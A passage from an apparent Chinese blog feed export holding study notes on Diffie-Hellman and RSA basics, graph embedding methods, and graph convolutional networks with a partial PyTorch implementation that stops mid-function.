<h3 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h3><p>使用相同的密码进行加解密操作，只是加密算法和解密算法不同，但密钥的分发是要保密进行的。</p>
<p>例如DES算法和AES算法。</p>
<h3 id="DH密钥交换协议"><a href="#DH密钥交换协议" class="headerlink" title="DH密钥交换协议"></a>DH密钥交换协议</h3><p>DH密钥交换协议使得发送接收双方在不安全信道上共享密钥，该密钥用于双方加解密密钥。容易受到中间人攻击。DH算法的安全性依赖于计算离散对数的困难程度，例如y&#x3D;(g的x次方) mod p,p为素数。交换过程如下。</p>
<img src="/2023/03/17/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%80%E4%BB%8B/image-20230317201802649.png" class title="image-20230317201802649">

<p>DH协议大致过程：</p>
<ul>
<li><p>客户端和服务端先对p和g达成一致，并且公开出来。中间人C也知道。</p>
</li>
<li><p>客户端生成私钥整数a，然后使用<strong>A&#x3D;g^a mod p</strong> 得到公钥A发给服务端。中间人C也知道。</p>
</li>
<li><p>服务端也生成私钥整数b，然后使用<strong>B&#x3D;g^b mod p</strong>得到公钥B发给服务端。中间人也知道。</p>
</li>
<li><p>客户端使用<strong>S&#x3D;B^a mod p&#x3D;g^b^a mod p</strong>计算出S</p>
</li>
<li><p>服务端使用<strong>S&#x3D;A^b mod p&#x3D;g^a^b mod p</strong>计算出S</p>
</li>
<li><p>这样就得出了公用的密钥S，然后使用共享密钥S进行加解密操作。</p>
<p><strong>安全性：</strong></p>
<p>虽然客户端服务端传输的公钥A、B公开，由于客户端服务端双方生成的a、b密钥是私钥不进行传输，并由于离散对数的难解，破解出最终的对称密钥是及其困难的。</p>
<p>但是容易受到中间人工攻击。即攻击者通过伪造服务端身份和客户端身份协商密钥，攻击者通过伪造客户端身份和服务端身份协商密钥，这样攻击者就分别获得和客户端和服务端的共享密钥。这样攻击者就可以通过中间人的身份修改被客户端和服务端之间的信息啦。</p>
</li>
</ul>
<h3 id="公钥密码"><a href="#公钥密码" class="headerlink" title="公钥密码"></a>公钥密码</h3><p>公钥密码不同于对称密码，其加解密密码不一样，也称非对称密码。发送方和接收方各自生成自己的密钥对，过程大致是发送方使用对方的公钥进行加密处理，只有接收方使用自己的私钥才能对其解密获取信息。</p>
<h4 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h4><p>给出两个素数，很容易得到乘积，但想反推得到这两个素数就很困难。</p>
<p><strong>密钥对生成</strong></p>
<ul>
<li>选取两位非常大的素数<strong>p</strong>和<strong>q</strong></li>
<li>计算出大素数乘积<strong>n</strong>&#x3D;q<em>p，*<em>m</em></em>&#x3D;(p-1) * (q-1)，这里m是n的欧拉函数</li>
<li>找到满足gcd(m,e) &#x3D; 1的<strong>e</strong>(1&lt;e&lt;m)，即e和m互素</li>
<li>找到满足ed mod m &#x3D; 1的<strong>d</strong>(e在模m域上的逆元d)</li>
<li>**(n,e)<strong>为公钥，</strong>(n,d)**为私钥</li>
</ul>
<p><strong>RSA加密</strong></p>
<p>对于明文x，使用公钥(n,e)对x加密的过程，就是将x转换为数字，然后通过幂取模计算得到y。<br>$$<br>y&#x3D;x^e    mod     n<br>$$<br><strong>RSA解密</strong></p>
<p>对于密文y，使用私钥(n,d)对y进行解密的过程，就是将y转换为数字，然后通过幂取模计算得到x。<br>$$<br>x &#x3D; y^d mod n<br>$$<br>由于n是大整数，大整数的因素分解暂时没有高效的算法。只要将n分解，则q和p就能计算出来。</p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>-密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>图嵌入模型</title>
    <url>/2024/01/17/%E5%9B%BE%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="图嵌入模型"><a href="#图嵌入模型" class="headerlink" title="图嵌入模型"></a>图嵌入模型</h1><p>图是复杂系统中常用的信息载体，可以表示现实中许多复杂关系，如社交网络、犯罪网络、交通网络等。图结构作为一种非欧几里德数据，很难直接应用卷积神经网络和循环神经网络。</p>
<p>为了构造用于图数据挖掘的特征表示，<a href="https://so.csdn.net/so/search?q=%E5%9B%BE%E5%B5%8C%E5%85%A5&spm=1001.2101.3001.7020">图嵌入</a><strong>将节点从高纬度空间映射到低维空间，生成保留原始图中某些重要信息的低维向量</strong>。<strong>（将图节点或者子图转换为向量）</strong>。主要应用于网络重构、系欸但分类、链接预测、聚类、异常检测和可视化。</p>
<img src="/2024/01/17/%E5%9B%BE%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B/image-20231121104225718.png" class title="image-20231121104225718">

<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>静态图：节点和边不随时间变化</p>
<p>动态图：按时间分布一系列演化图</p>
<p>一阶相似性：节点之间的成对邻近度，两个节点之间直接相连</p>
<img src="/2024/01/17/%E5%9B%BE%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B/image-20231121113123908.png" class title="image-20231121113123908">

<p>二阶相似性：节点邻域结构的相似度，两个节点由相同的邻居</p>
<img src="/2024/01/17/%E5%9B%BE%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B/image-20231121113145955.png" class title="image-20231121113145955">

<p>图嵌入：将每个节点映射成低微向量表示，保留原始图中某些关键信息</p>
<img src="/2024/01/17/%E5%9B%BE%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B/image-20231120212740818.png" class title="image-20231120212740818">

<h2 id="图嵌入分类"><a href="#图嵌入分类" class="headerlink" title="图嵌入分类"></a>图嵌入分类</h2><p>分为节点嵌入和整图嵌入</p>
<p><strong>节点嵌入：</strong>将原始图上每个节点通过嵌入得到一个向量表达。可用于简单任务，如判断两个节点的相似性。</p>
<p><strong>整图嵌入：</strong>将整张图通过嵌入得到一个向量表示。用于比较两个图的相似性。</p>
<h2 id="图嵌入模型分类"><a href="#图嵌入模型分类" class="headerlink" title="图嵌入模型分类"></a>图嵌入模型分类</h2><img src="/2024/01/17/%E5%9B%BE%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B/image-20231120212932904.png" class title="image-20231120212932904">

<h3 id="基于矩阵分解的图嵌入"><a href="#基于矩阵分解的图嵌入" class="headerlink" title="基于矩阵分解的图嵌入"></a>基于矩阵分解的图嵌入</h3><p>通过分解节点关系矩阵获得低维嵌入。不同的关系矩阵采用的分解方法不同 ，例如邻接矩阵通常使用奇异值分解（SVD）的方法生成节点嵌入，而属性矩阵通常使用特征值分解的方法。</p>
<img src="/2024/01/17/%E5%9B%BE%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B/image-20231120213302261.png" class title="image-20231120213302261">

<p><strong>静态图嵌入</strong></p>
<p>基于矩阵分解的静态图嵌入模型对节点关联信息矩阵和属性信息矩阵进行特征分解，然后将分解得到的属性嵌入和结构嵌入进行融合，生成节点的低维嵌入表示</p>
<p>局部线性映射LLE将每个节点表示为相邻节点的线性组合，构造邻域保持映射。具体实现分为三步：</p>
<ul>
<li>以某种度量方式选择k个邻接节点</li>
<li>由k个近邻线性加权重构节点，并最小化节点重建误差获得最优权重</li>
<li>最小化最优权重构建的目标函数生成Y</li>
</ul>
<p><strong>动态图嵌入</strong></p>
<p>基于矩阵分解的动态图方法利用特征分解构造图的高阶相似度矩阵，然后利用矩阵摄动理论更新图的动态信息。DANE采用分布式框架：离线部分，采用最大化相关性的方法捕捉图结构和节点属性的依赖关系在线部分，使用矩阵摄动理论更新嵌入的特征值和特征向量。</p>
<img src="/2024/01/17/%E5%9B%BE%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B/image-20231120214207129.png" class title="image-20231120214207129">

<h3 id="基于随机游走的图嵌入"><a href="#基于随机游走的图嵌入" class="headerlink" title="基于随机游走的图嵌入"></a>基于随机游走的图嵌入</h3><p>基于随机游走的图嵌入方法将节点转化为词，将随机游走序列作为句子，利用Skip-Gram 生成节点的嵌入向量。随机游走法可以保留图的结构特性，并且在无法完整观察的大型图上仍有不错的表现。</p>
<p><strong>静态嵌入：</strong>基于随机游走的静态图嵌入模型通过随机游走获得训练语料库，然后将语料库集成到 Skip-Gram 获得节点的低维嵌入表示。</p>
<p>Deepwalk使用随机游走对节点进行采样，生成节点序列，再通过 Skip-Gram 最大化节点序列中窗口范围内节点之间的共现概率</p>
<img src="/2024/01/17/%E5%9B%BE%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B/image-20231120214928385.png" class title="image-20231120214928385">

<p>Deepwalk不仅在数据量较少时有较好的表现，还可以扩展到大型图的表示学习。由于优化过程中未使用明确的目标函数，使得模型保持网络结构的能力受到限制。</p>
<img src="/2024/01/17/%E5%9B%BE%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B/image-20231120214957161.png" class title="image-20231120214957161">

<p>node2vec在Deepwalk的基础上，引入有偏的随机游走，增加邻域搜索的灵活性，生成质量更高、信息更多的嵌入表示。通过设置 p 和 q 两个参数，平衡广度优先搜索和深度优先搜索策略，使生成的嵌入能够保持社区结构等价性或邻域结构等价性。</p>
<p><strong>基于随机游走的动态图嵌入</strong></p>
<p>CTDNE利用时间随机游走从连续型动态图中学习包含时间信息的嵌入表示，CTDNE 采用的时间随机游走与静态图方法相似，但约束每个随机游走符合边出现的时间顺序，即边的遍历必须按照时间递增的顺序，由于每条边包含多个时间戳，使得同一节点可能在游走中出现多次。</p>
<h3 id="基于自编码器的图嵌入"><a href="#基于自编码器的图嵌入" class="headerlink" title="基于自编码器的图嵌入"></a><strong>基于自编码器的图嵌入</strong></h3><p>自编码器使隐藏层学习到的表示维度小于输入数据，即对原始数据进行降维。基于自编码器的图嵌入方法使用自编码器对图的非线性结构建模，生成图的低维嵌入表示(SDNE)。</p>
<p> <strong>基于自编码器的静态图嵌入</strong></p>
<p>基于自编码器的图嵌入方法起源于使用稀疏自编码器的 GraphEncoder。其基本思想是将归一化的图相似度矩阵作为节点原始特征输入到稀疏自编码器中进行分层预训练，使生成的低维非线性嵌入可以近似地重建输入矩阵并保留稀疏特性。</p>
<p> <strong>基于自编码器的动态图嵌入</strong></p>
<p>基于自编码器的动态图方法将每个时刻训练的参数作为下一时刻自编码器的初始值，从而在一定程度上保持生成嵌入的稳定性，提高模型的计算效率。</p>
<h3 id="基于图神经网络的图嵌入"><a href="#基于图神经网络的图嵌入" class="headerlink" title="基于图神经网络的图嵌入"></a><strong>基于图神经网络的图嵌入</strong></h3><p>图神经网络（GNN）是专门处理图数据的深度模型，其利用节点间的消息传递来捕捉某种依赖关系，使生成的嵌入可以保留任意深度的邻域信息。</p>
<p> <strong>基于图神经网络的静态图嵌入</strong></p>
<p>基于 GNN的静态图模型聚合节点邻域的嵌入并不断迭代更新，利用当前的嵌入及上一次迭代的嵌入生成新的嵌入表示。</p>
<ul>
<li>GraphSAGE 不是为每个节点训练单独的嵌入，而是通过采样和聚合节点的局部邻域特征训练聚合器函数，同时学习每个节点邻域的拓扑结构及特征分布，生成嵌入表示。</li>
<li>图注意力网络（graph attention network，GAT）在 GCN 的基础上引入注意力机制，对邻近节点特征加权求和，分配不同的权值。</li>
</ul>
<p> <strong>基于图神经网络的动态图嵌入</strong></p>
<p>基于 GNN的动态图模型通常在静态图模型的基础上，引入一种循环机制更新网络参数，实现动态过程的建模，使生成低维嵌入可以有效保留图的动态演化信息。</p>
<ul>
<li>DyRep将动态图嵌入假设为图的动态（拓扑演化）和图上的动态交织演化（节点间的活动）的中介过程。</li>
<li>DySAT通过邻域结构和时间两个维度的联合自注意力来计算节点嵌入，结构注意力块通过自注意聚集和堆叠从每个节点局部邻域中提取特征。</li>
</ul>
]]></content>
      <categories>
        <category>机器学习</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-图嵌入 -GNN</tag>
      </tags>
  </entry>
  <entry>
    <title>图神经网络(GCN)</title>
    <url>/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/</url>
    <content><![CDATA[<h1 id="图神经网络-GCN"><a href="#图神经网络-GCN" class="headerlink" title="图神经网络(GCN)"></a>图神经网络(GCN)</h1><p>本文主要记录对GCN的相关内容的学习，其中包含基本原理、示例以及代码实现</p>
<h2 id="图网络"><a href="#图网络" class="headerlink" title="图网络"></a>图网络</h2><p>图网络的核心思想就是<strong>依据图结构的空间依赖关系来表征真实特征之间的相互作用关系，通过对节点特征聚合生成新的节点特征表示</strong></p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119151821253.png" class title="image-20231119151821253">

<p>上图为一张交通系统的图结构，在6个位置上分别有一个传感器记录了一段时间的交通流量数据，现在的目标是要预测接下来每个位置上未来一段时间的流量。该怎么去思考？从时间序列本身的角度来思考，未来的数据一定是与过去的数据相关，因此我们可以对6个位置的时间序列单独进行预测生成6个位置未来的预测值，但是这样做有一个缺点，没有考虑到节点之间的空间依赖关系，假设4节点流量非常大，那么他相邻的3&#x2F;5&#x2F;6节点大概率流量也是非常大的，既然已经用图结构表示出了这种空间关系，那么我们怎么去应用它？这就是图网络所要解决的问题。</p>
<h2 id="图卷积网络"><a href="#图卷积网络" class="headerlink" title="图卷积网络"></a>图卷积网络</h2><p>图卷积网络的本质就是<strong>提取图结构的空间特征，聚合邻居节点的信息。</strong></p>
<p>基于提取方式不同可以分为：</p>
<ul>
<li>基于空间域的图网络。从图结构出发，聚合邻居节点的信息作为新特征，不断的进行消息传递的过程</li>
<li>基于谱域的图网络。将原始数据转换成谱域中，利用图谱理论引入滤波器进行滤波，再转换回时域的过程</li>
</ul>
<h3 id="基于空间域的图网络"><a href="#基于空间域的图网络" class="headerlink" title="基于空间域的图网络"></a>基于空间域的图网络</h3><h4 id="邻接矩阵A"><a href="#邻接矩阵A" class="headerlink" title="邻接矩阵A"></a>邻接矩阵A</h4><p>假设输入为x，网络权重为W图卷积神经网络可以表示为<br>$$<br>f&#x3D;σ(Axw)<br>$$<br>BP神经网络可以表示为<br>$$<br>f&#x3D;σ(xw)<br>$$<br>对于BP网络，输入X经过网络的计算后，表示对每个样本的各个特征进行线性组合生成新的特征，再使用激活函数对其进行激活的过程。而图神经网络再输入X前乘了一个A图结构矩阵，那么AX就表示利用图结构来对各个样本的特征进行重新整合作为新的输入，然后再输入到BP神经网络中，这样就考虑到了特征之间的空间依赖关系。</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119154655916.png" class title="image-20231119154655916">

<p>如上图需重新计算E的特征的话，根据GCN的思想就需要聚合其邻居节点的信息，就是对ABCD节点的特征以一定方式进行聚合(平均、求和、拼接等)，这里以求和为例：</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119155030493.png" class title="image-20231119155030493">

<p>引入邻接矩阵A，则聚合求和又可以表示为</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119155152871.png" class title="image-20231119155152871">

<p>设n为节点数，f为每个节点的特征维度，则邻接矩阵A的形状为 (n,n) ,特征矩阵的形状为 (n,f) ，AX相乘后表示考虑到邻居节点信息的新的特征矩阵，形状为 (n,f) ，每一行表示一个节点的特征，可以看出新的E节点，也就是矩阵相乘后的最后一行就是ABCD节点的相加。相比于手动计算，采用邻接矩阵，我们能一次性将所有的节点特征表示出来。</p>
<p>但再上面新的特征矩阵中B和C的特征向量是一样的，因为他两的邻居节点是相同的。但由于两个点是不同位置不同特征的节点，得到新的特征向量是不合理的。<strong>所以不仅要考虑邻居的节点，还需要考虑自身的节点</strong>。</p>
<p>新的邻接矩阵为：</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119162554765.png" class title="image-20231119162554765">

<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119162632572.png" class title="image-20231119162632572">

<p>将新的邻接矩阵左乘特征矩阵X得到新的特征矩阵</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119162751062.png" class title="image-20231119162751062">

<p>从上面可以看到，为了避免B和C拥有相同的邻居而导致新特征也一样的情况，需要考虑自身节点的影响，所以对原来的邻接矩阵添加一个单位矩阵I来表示自身节点。可以看到新的邻接矩阵得到的特征矩阵B和C特征向量不一样。</p>
<h4 id="求平均-归一化"><a href="#求平均-归一化" class="headerlink" title="求平均(归一化)"></a>求平均(归一化)</h4><p>对于上面的求和聚合变相的改变了特征的量级。若要求收入的话，则使用求平均聚合方式。类比到图结构就是左乘度矩阵。</p>
<p>度矩阵就是与该节点相邻节点的数据，因此邻接矩阵A的每一行的求和组成的对角矩阵，如下</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119164607957.png" class title="image-20231119164607957">

<p>通用也需要考虑到自身节点的影响，也对度矩阵加单位矩阵得到新的度矩阵</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119165022205.png" class title="image-20231119165022205">

<p>所以最终的求平均矩阵就是</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119165213290.png" class title="image-20231119165213290">

<p>由于左成初等矩阵相当于行变换，相当于对前面求和的特征矩阵X‘每一行除以度，就是对每一个节点求和后的特征做的平均</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119165505950.png" class title="image-20231119165505950">

<h4 id="renormalization"><a href="#renormalization" class="headerlink" title="renormalization"></a>renormalization</h4><p>上面求平均的方式存在不合理的地方，假设节点自身数据很小，但由于邻居节点数据很大，平均下来节点的数据自然也变大了</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119170032529.png" class title="image-20231119170032529">

<p>上面的改进公式相当于对新的邻接矩阵进行初等行列变换，这个变换就相当于 i节点与 j 节点的关系系数再除以 i 节点度的平当根与 j 节点系数平方根的积，这样节点之间的关系系数（权重）不再与某一个节点优点，而分别考虑到了两个节点的度，<strong>邻居节点的度越大，权重越小，也即一个节点的边越多，由于节点的总的信息是一定的，那么他通过每条边的信息量越少，即通过某条边向外发送的信息越少。</strong></p>
<h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><p>图网络就是不断考虑邻居节点以及自身信息的迭代过程，每一次迭代就是一次特征重组</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119171420327.png" class title="image-20231119171420327">

<p>一个两层的GCN网络为</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231119171700937.png" class title="image-20231119171700937">

<p>对比前面的BP神经网络，GCN就是一种BP神经网络，只不过是将输入经过邻接矩阵及度矩阵变换的考虑到空间信息的特征输入。</p>
<h3 id="基于频域角度"><a href="#基于频域角度" class="headerlink" title="基于频域角度"></a>基于频域角度</h3><p><strong>GCN是一种基于频域的方法</strong>，空间域的GCN只是频域GCN推导的一个特例，然后从空间角度解读出来而已。卷积和空间域变换一样就是为了提取相邻节点的信息，对节点特征进行重新表示。</p>
<h4 id="傅里叶变换"><a href="#傅里叶变换" class="headerlink" title="傅里叶变换"></a>傅里叶变换</h4><p>数学上的卷积是<strong>两个函数的卷积等于各自傅里叶变换后的乘积的逆傅里叶变换</strong></p>
<p>本质上就是一个基空间变换，找到一组函数正交基，将原函数向各个基上进行投影得到基上的坐标，从而将原函数改写为新的坐标下（模态、谱）的表示：<br>$$<br>f(x) &#x3D; f(\hat\lambda_1)u_1+f(\hat\lambda_2)u_2+…+f(\hat\lambda_n)u_n<br>\f(\hat\lambda)为原函数f(x)在新基上的坐标值<br>$$<br>基上的坐标为原函数与基函数的内积除以基函数自身的内积(函数内积为积分)，公式如下:<br>$$<br>x&#x3D;\frac{\int_b^a(f,g)dx}{\int_b^a(g,g)dx}&#x3D;\frac{\sum(f_i<em>g_i)}{\sum(g_i</em>g_i)}<br>$$<br>所以各个坐标基上的坐标值可以用矩阵表示</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120122120507.png" class title="image-20231120122120507">

<p>逆傅里叶变换为</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120122145326.png" class title="image-20231120122145326">

<h4 id="卷积"><a href="#卷积" class="headerlink" title="卷积"></a>卷积</h4><p>对一节点特征的卷积就是为了对特征进行重组，重组后的特征包含了节点之间的空间关系。</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120150423156.png" class title="image-20231120150423156">

<p>从两种视角来理解这个公式</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120150556146.png" class title="image-20231120150556146">

<h4 id="特征矩阵U"><a href="#特征矩阵U" class="headerlink" title="特征矩阵U"></a>特征矩阵U</h4><p>矩阵U是一个正交矩阵，是原函数在新的坐标系下的坐标基，因此U的每一列都是单位向量且各列两两正交</p>
<p>根据线性代数可得，实对称矩阵一定可以对角化，且不同特征值对应的特征向量相互正交，设实对称矩阵A的特征矩阵为P，则$\Lambda$是特征值组成的对角矩阵</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120152114018.png" class title="image-20231120152114018">



<p>由此可以推出上面的H滤波器就是一个对称矩阵，<strong>U就是H的特征向量组成的特征矩阵</strong>，$\Lambda_H$是特征值组成的对角矩阵。而$\Lambda_H$则在图卷积中一般采用拉普拉斯矩阵计算。</p>
<h4 id="拉普拉斯算子"><a href="#拉普拉斯算子" class="headerlink" title="拉普拉斯算子"></a>拉普拉斯算子</h4><p>拉普拉斯算子是一个标量，是梯度的散度，对一个函数，散度是该函数在坐标轴上偏导数之和：<br>$$<br>\Delta f &#x3D; \frac{\partial^2f}{\partial x^2}+\frac{\partial^2f}{\partial y^2}<br>$$<br>一阶偏导数可以表示为</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120153708514.png" class title="image-20231120153708514">

<p>图中每个节点都是离散的，取h为1，则</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120153737798.png" class title="image-20231120153737798">

<p>则二阶偏导为</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120153802384.png" class title="image-20231120153802384">

<p>所以在二维平面上f的拉普拉斯算子为：</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120153834401.png" class title="image-20231120153834401">

<p>上面这个式子就是中心点的上下左右四个方向的邻居节点的和与4倍的中心节点之间的差值</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120154018280.png" class title="image-20231120154018280">

<h4 id="拉普拉斯矩阵"><a href="#拉普拉斯矩阵" class="headerlink" title="拉普拉斯矩阵"></a>拉普拉斯矩阵</h4><p>类比到图中，拉普拉斯算子定义在中心节点i与邻居节点之间的运算，即：<br>$$<br>\Delta f_i &#x3D; \sum_i(f_i-f_j)<br>$$<br>引入邻接矩阵A，$a_ij$表示邻接矩阵中第i行j列的值，可进一步推导，其中$d_i$表示第i个节点的度</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120155137079.png" class title="image-20231120155137079">

<p>对图网络类比表示如下</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120155245818.png" class title="image-20231120155245818">

<p>其中，D为度矩阵，A为邻接矩阵，L就是拉普拉斯矩阵，他是度矩阵与邻接矩阵的差。为了避免某些邻居节点对主节点产生很大的影响，需要正则化，因此公式优化为</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120155432487.png" class title="image-20231120155432487">

<p><strong>正则化后的拉普拉斯矩阵的最小特征值为0，最大特征值小于2。</strong></p>
<h4 id="Spectral-CNN"><a href="#Spectral-CNN" class="headerlink" title="Spectral CNN"></a>Spectral CNN</h4><p>上面说到，对某一节点特征的卷积就是为了对特征进行重组，重组后的特征就是滤波器H和重组前特征X相乘，所以图卷积的关键就是滤波器的选择。这里将上面正则化后的拉普拉斯矩阵$\hat{L}$作为滤波器，公式为：</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120160346159.png" class title="image-20231120160346159">

<p>则网络输出为：</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120160403462.png" class title="image-20231120160403462">

<p>Spectral CNN中将特征值组成的对角阵 $A_\hat{L}$ 替换为可学习参数$\theta_i$  ，通过神经网络自主调节各频率分量。</p>
<img src="/2024/01/17/%E5%9B%BE%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C(GCN)/image-20231120160618003.png" class title="image-20231120160618003">

<p><strong>缺点</strong></p>
<p>①需要对拉普拉斯矩阵进行特征分解，每一次的特征重组都要进行一次矩阵乘法，时间复杂度为 $O(n^2)$ ，计算开销大；<br>②卷积核需要n个参数，当图特别大的时候，参数也越多。<br>③模型是全局连接的，并不是局部连接，也就是模型在每一次更新特征的时候用到了全部的节点，而不是仅仅是邻居节点，</p>
<h3 id="pytorch实现"><a href="#pytorch实现" class="headerlink" title="pytorch实现"></a>pytorch实现</h3><p>由于频域的GCN需要具体问题具体分析，下面只实现基于空域的GCN</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch </span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GCN</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span>  <span class="title">__init__</span>(<span class="params">self, nfeat, nhid, nclass, dropout</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(GCN, self).__init__()</span><br><span class="line"></span><br><span class="line">        self.gc1 = GraphConvolution(nfeat, nhid)</span><br><span class="line">        self.gc2 = GraphConvolution(nhid, nclass)</span><br><span class="line">        self.dropout = dropout</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x, adj</span>):</span>    <span class="comment">#x特征矩阵,agj邻接矩阵 </span></span><br><span class="line">        x = F.relu(self.gc1(x, adj))</span><br><span class="line">        x = F.dropout(x, self.dropout, training=self.training)</span><br><span class="line">        x = self.gc2(x, adj)</span><br><span class="line">        <span class="keyword">return</span> F.log_softmax(x, dim=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GraphConvolution</span>(<span class="params">Module</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Simple GCN layer, similar to https://arxiv.org/abs/1609.02907</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, in_features, out_features, bias=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(GraphConvolution, self).__init__()</span><br><span class="line">        self.in_features = in_features</span><br><span class="line">        self.out_features = out_features</span><br><span class="line">        self.weight = Parameter(torch.FloatTensor(in_features, out_features))</span><br><span class="line">        <span class="keyword">if</span> bias:</span><br><span class="line">            self.bias = Parameter(torch.FloatTensor(out_features))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.register_parameter(<span class="string">&#x27;bias&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        self.reset_parameters()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_parameters</span>(<span class="params">self</span>):</span></span><br><span class="line">        stdv = <span class="number">1.</span> / math.sqrt(self.weight.size(<span class="number">1</span>))</span><br><span class="line">        self.weight.data.uniform_(-stdv, stdv)</span><br><span class="line">        <span class="keyword">if</span> self.bias <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.bias.data.uniform_(-stdv, stdv)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, <span class="built_in">input</span>, 